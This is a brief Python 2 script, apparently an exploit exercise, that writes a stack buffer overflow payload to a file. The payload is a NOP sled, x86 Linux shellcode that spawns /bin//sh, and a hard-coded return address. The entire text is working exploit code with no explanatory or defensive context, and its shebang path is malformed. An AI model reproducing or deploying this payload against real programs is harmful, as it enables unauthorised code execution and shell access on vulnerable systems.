#!/bin/usr/python
## JUMP + ESP/RSP
## Author : Ramin Farapour Cami
import struct


jump_shellcode = struct.pack("<I", 0xffffd0fc)
shellcode = "\x83\xec\x18\x31\xc9\xf7\xe1\x51\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
buffer = "\x90" * 35
buffer += shellcode
buffer += jump_shellcode
fp = open("3.txt", "w")
fp.write(buffer)
fp.close()
print "Done!"

